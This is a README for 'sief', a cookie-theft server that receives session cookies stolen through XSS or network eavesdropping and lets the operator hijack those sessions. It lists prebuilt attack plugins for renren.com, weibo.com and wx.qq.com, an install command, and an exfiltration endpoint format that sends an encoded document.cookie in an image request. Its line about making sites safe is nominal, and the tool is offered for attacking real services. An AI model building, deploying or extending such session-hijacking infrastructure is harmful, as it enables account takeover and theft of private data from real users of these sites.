sief
=============

NOTICE: This project is under development, nut ready to use yet.

A server listening to cookie submission to hijack session, supporting writing plugins for site specific attacks.

    sief = thief + safe

This is a project to steal sessions, and to make your site safe.

## Features

* Request to an image to upload cookies stolen by xss/network eavsdropping/dns hijack/other.
* Log persistence
* Prebuilt plugins to attack renren.com, weibo.com, wx.qq.com
* Write your own plugin to do other attacks you desired
* View real-time cookie submissions and login those hijacked sessions directly in browser with [Sief Chrome Extension](https://github.com/shaoshuai0102/sief-chrome-extension)

## Install

    npm install sief -g

## Usage

### Server

    Usage: sief [options] <plugin|dir ...>

    Options:

      -h, --help                   output usage information
      -V, --version                output the version number
      -i, --ignore-time [seconds]  specify seconds during which same requests will be ignored [300]
      -p, --port [port]            specify the port sief server listening to [3000]
      -l, --log-level [level]      set log level [INFO]


### Submit cookies

    GET /xxx.png?cookie=#cookies#&referer=#referer#&domain=#domani#

Parameters:

* `cookies` - Required. Encode cookies first, for example, `encodeURIComponent(document.cookies)`
* `referer` - If the attack is an xss exploit, referer will be retrieved from `headers.referer` directly, otherwise, specifiy it in query string.
* `domain` - Domain is calculated from referer, defaults to main domain, for example `qq.com`. IF you want to fire a attack to its subdomain(`wx.qq.com`), specify it in query string.